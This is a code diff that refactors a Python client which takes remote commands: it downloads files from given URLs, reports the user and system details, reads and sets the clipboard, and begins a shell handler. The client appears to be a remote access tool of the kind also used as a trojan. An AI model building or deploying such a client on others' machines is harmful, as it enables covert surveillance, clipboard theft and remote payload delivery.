@@ -393,8 +393,8 @@ class Client(object):
                 logging.info('Downloading "%s" from %s', data[2], data[1])
                 try:
                     request = requests.get(data[1])
-                    with open(data[2], 'wb') as f:
-                        f.write(request.content)
+                    with open(data[2], 'wb') as _file:
+                        _file.write(request.content)
                 except Exception as err:
                     self.send_json([False, errors(err, line=False)])
                     continue
@@ -403,7 +403,8 @@ class Client(object):
 
             if data[0] == 'INFO':
                 self.send(f'User: {getpass.getuser()}\n' \
-                    f'OS: {platform.system()} {platform.release()} ({platform.platform()}) ({platform.machine()})\n' \
+                    f'OS: {platform.system()} {platform.release()} ' \
+                    f'({platform.platform()}) ({platform.machine()})\n' \
                     f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                 continue
 
@@ -467,16 +468,19 @@ class Client(object):
             if data[0] == 'COPY':
                 try:
                     pyperclip.copy(data[1])
-                    self.send_json([True, None])
-                except Exception as err:
+                except pyperclip.PyperclipException as err:
                     self.send_json([False, errors(err)])
+                    continue
+                self.send_json([True, None])
                 continue
 
             if data[0] == 'PASTE':
                 try:
-                    self.send_json([True, pyperclip.paste()])
-                except Exception as err:
+                    clipboard = pyperclip.paste()
+                except pyperclip.PyperclipException as err:
                     self.send_json([False, errors(err)])
+                    continue
+                self.send_json([True, clipboard])
                 continue
 
             if data[0] == 'SHELL':
